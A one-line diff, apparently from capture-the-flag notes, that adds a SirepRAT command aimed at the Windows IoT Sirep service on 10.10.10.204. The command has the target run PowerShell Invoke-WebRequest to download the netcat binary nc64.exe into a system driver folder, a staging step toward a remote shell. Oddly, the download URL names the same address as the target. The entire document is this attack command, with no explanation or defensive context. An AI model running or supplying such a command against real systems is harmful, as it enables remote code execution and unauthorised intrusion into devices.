@@ -1,0 +1,1 @@
+python2 SirepRAT.py 10.10.10.204 LaunchCommandWithoutOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.10.204:8080/nc64.exe" -v
